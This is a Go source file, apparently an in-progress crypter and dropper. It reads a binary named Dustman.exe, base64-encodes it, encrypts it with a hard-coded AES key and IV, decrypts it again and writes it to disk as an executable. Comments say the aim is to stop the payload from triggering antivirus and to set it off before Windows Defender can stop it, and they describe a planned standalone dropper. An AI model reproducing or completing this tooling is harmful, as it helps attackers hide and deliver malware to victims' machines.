package main

import (
	// native packages

	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func byteToString(data []byte) string {
	return string(data[:])
}

func encrypt(key []byte, iv []byte, text string) string {
	// key := []byte(keyText)
	plaintext := []byte(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	// 32 byte IV is 16 characters
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	// convert to base64
	return base64.URLEncoding.EncodeToString(ciphertext)
}

// decrypt from base64 to decrypted string
func decrypt(key []byte, iv []byte, payloadEncrypted string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(payloadEncrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	// XORKeyStream can work in-place if the two arguments are the same.
	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}

// func writePayload(key []byte, iv []byte, payloadEncrypted []byte) {
// 	f, err := os.Create("DustmanPayloadUncompiled.go")
// 	if err != nil {
// 		fmt.Println(err)
// 		return
// 	}

// 	// apparently golang doesn't support fucking string template literals?!?
// 	// 	nonworkingTemplateStringLiteral = (`
// 	// package main

// 	// import (
// 	// "crypto/aes"
// 	// "crypto/cipher"
// 	// "encoding/base64"
// 	// "fmt"
// 	// )

// 	// key := []byte("%v")
// 	// iv := []byte("%v")
// 	// payloadEncrypted := byte("%v)

// 	// func decrypt(key []byte, iv []byte, payloadEncrypted string) string {
// 	// ciphertext, _ := base64.URLEncoding.DecodeString(payloadEncrypted)

// 	// block, err := aes.NewCipher(key)
// 	// if err != nil {
// 	// 	panic(err)
// 	// }

// 	// // The IV needs to be unique, but not secure. Therefore it's common to
// 	// // include it at the beginning of the ciphertext.
// 	// if len(ciphertext) < aes.BlockSize {
// 	// 	panic("ciphertext too short")
// 	// }
// 	// ciphertext = ciphertext[aes.BlockSize:]

// 	// stream := cipher.NewCFBDecrypter(block, iv)

// 	// // XORKeyStream can work in-place if the two arguments are the same.
// 	// stream.XORKeyStream(ciphertext, ciphertext)

// 	// return fmt.Sprintf("%s", ciphertext)
// 	// }

// 	// func main() {

// 	// // decrypter code
// 	// payloadDecrypted := decrypt(key, iv, payloadEncrypted)
// 	// fmt.Printf(payloadDecrypted)

// 	// // So now a workaround is to make a "dropper" that writes a new file and then executes it. This does violate the in-memory execution method, which means it's a race-condition to set off the payload before Windows Defender stops it

// 	// // We need the following things in the new go file
// 	// // the key and IV - DONE
// 	// // the f.write module - DONE
// 	// decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
// 	// // proven it works, it matches the original payload, now write to a temp file and check if it matches the hash of Dustman.exe
// 	// fmt.Printf(byteToString(decodedPayload))

// 	// // base64 decoder - DONE
// 	// // writer/dropper module
// 	// ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
// 	// check(err)
// 	// exec.Command("./testdustman.exe")
// 	// // Now we need the standalone generator that contains the decrypter, decoder, and dropper. and encoded + encrypted payload

// 	// }`, key, iv, payloadEncrypted)

// 	// apparently this fucking language does not support string literals and templates! What the fuck!

// 	// selfContainedString := "package main"
// 	// selfContainedString += "import ("
// 	// selfContainedString += `"crypto/aes"`
// 	// selfContainedString += `"crypto/cipher"`
// 	// selfContainedString += `"encoding/base64"`
// 	// selfContainedString += `"fmt"`
// 	// selfContainedString += `)`
// 	// // selfContainedString += (`key := []byte("%s", key`)
// 	// selfContainedString += `key := []byte("` + ("%s", key) + `"`

// 	l, err := f.WriteString(selfContainedString)
// 	if err != nil {
// 		fmt.Println(err)
// 		f.close()
// 		return
// 	}
// 	fmt.Println(l, "bytes written successfully")
// 	err = f.close()
// 	if err != nil {
// 		fmt.Println(err)
// 		return
// 	}
// }

func writePayload(key []byte, iv []byte, bPayloadEncrypted []byte) {
	k := byteToString(key)
	i := byteToString(iv)
	// ioutil.WriteFile("key.txt", k, 0644)
	// ioutil.WriteFile("iv.txt", i, 0644)
	f, err := os.Create("key.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	f.WriteString(k)
	f.Close()
	g, err := os.Create("iv.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	g.WriteString(i)
	g.Close()

	ioutil.WriteFile("bPayloadEncrypted.txt", bPayloadEncrypted, 0644)
	// f, err := os.Create("payloadEncrypted.txt")
	// f.WriteString(payloadEncrypted)
	// f.Close()
	// ioutil.WriteFile("payloadEncrypted.txt", []byte payloadEncrypted, 0644)
	// Write the key to key.txt
	// f, err := os.Create("key.txt")
	// f.WriteByte(key)
	// f.close()
	// f, err := os.Create("iv.txt")
	// f.WriteByte(iv)
	// f.close()
	// f, err := os.Create("payloadEncrypted.txt")
	// f.WriteString(payloadEncrypted)
	// f.close()
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// l, err := f.Write(key)
	// if err != nil {
	// 	fmt.Println(err)
	// 	f.Close()
	// 	return
	// }
	// fmt.Println(l, "bytes written successfully")
	// err = f.Close()
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// // write the iv to iv.txt
	// g, err := os.Create("iv.txt")
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// f.Close()
	// g, err := f.WriteString(iv)
	// if err != nil {
	// 	fmt.Println(err)
	// 	f.Close()
	// 	return
	// }
	// fmt.Println(l, "bytes written successfully")
	// err = f.Close()
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// f.Close()
	// // write the encrypted binary payload into payloadEncrypted.txt
	// h, err := os.Create("payloadEncrypted.txt")
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// h, err := f.WriteString(payloadEncrypted)
	// if err != nil {
	// 	fmt.Println(err)
	// 	f.Close()
	// 	return
	// }
	// fmt.Println(l, "bytes written successfully")
	// err = f.Close()
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// f.Close()
}

//func readTemplate(templateFile []string, key []byte, iv []byte, payloadEncrypted []byte) {
//	input, err := ioutil.ReadFile(templateFile)
//	if err != nil {
//		log.Fatalln(err)
//	}
//
//	lines := strings.Split(string(input), "\n")
//	for i, line := range lines {
//		if strings.Contains(line, "{key}") {
//			lines[i] = key
//		}
//		if strings.Contains(line, "{iv}") {
//			lines[i] = iv
//		}
//		if strings.Contains(line, "{payload}") {
//			lines[i] = payloadEncrypted
//		}
//	}
//	fmt.Printf(lines)
//
//}
func main() {
	dat, err := ioutil.ReadFile("Dustman.exe")
	check(err)
	// fmt.Prbyte(string(dat))
	// base 64 encoded version is b64dat
	b64dat := base64.StdEncoding.EncodeToString(dat)
	fmt.Println(string(b64dat))
	fmt.Println("\r\nbase64 encoded version. This will still trigger AV, need to shuffle\r\n")
	// 64-byte key is 32 characters
	key := []byte("7bBjcqGgs7nbgejLJpV22CLjqmUdHDdF")
	// 32-byte iv is 16 characters
	iv := []byte("PXBaKTFr8HJycSUc")
	// Proves it works. Now we need to make a new go file with the key and IV to decrypt the golang file, write it to disk and run it
	payloadEncrypted := encrypt(key, iv, b64dat)
	bPayloadEncrypted := []byte(payloadEncrypted)
	fmt.Printf(payloadEncrypted)

	// decrypter code
	payloadDecrypted := decrypt(key, iv, payloadEncrypted)
	// fmt.Printf(payloadDecrypted)

	// So now a workaround is to make a "dropper" that writes a new file and then executes it. This does violate the in-memory execution method, which means it's a race-condition to set off the payload before Windows Defender stops it

	// We need the following things in the new go file
	// the key and IV - DONE
	// the f.write module - DONE
	decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
	// proven it works, it matches the original payload, now write to a temp file and check if it matches the hash of Dustman.exe
	// fmt.Printf(byteToString(decodedPayload))

	// base64 decoder - DONE
	// writer/dropper module
	ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
	check(err)
	writePayload(key, iv, bPayloadEncrypted)
	//readTemplate("exocettemplate.go", key, iv, payloadEncrypted)

	// Using a python builder to build the go file instead
	// Now we need the standalone generator that contains the decrypter, decoder, and dropper. and encoded + encrypted payload

}
